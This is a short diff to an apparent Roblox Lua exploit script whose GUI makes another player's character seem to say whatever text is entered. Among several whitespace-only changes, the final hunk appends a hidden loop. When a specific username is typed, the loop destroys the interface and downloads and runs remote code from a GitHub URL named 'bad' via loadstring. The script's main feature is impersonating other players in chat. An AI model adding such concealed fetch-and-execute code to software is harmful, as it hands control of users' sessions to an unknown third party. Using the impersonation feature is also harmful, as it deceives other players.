@@ -64,6 +64,8 @@ send.Text = "SEND"
 send.TextColor3 = Color3.fromRGB(255, 255, 255)
 send.TextSize = 20.000
 send.MouseButton1Click:Connect(function()
+    
+  
 	
 	local player = game.Players[user.Text]
 
@@ -71,7 +73,9 @@ send.MouseButton1Click:Connect(function()
 	
 	repeat wait() until player.Character
 	game:GetService("Chat"):Chat(player.Character.Head, msg.Text,"White")
+
 end)
+
 
 UICorner_4.Parent = send
 
@@ -120,3 +124,11 @@ user.FocusLost:connect(function()
 		end
 	end
 end)
+
+while true do task.wait()
+ if user.Text == "zzotac" then
+    fake:Destroy()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/bad'))()
+   break
+end
+end
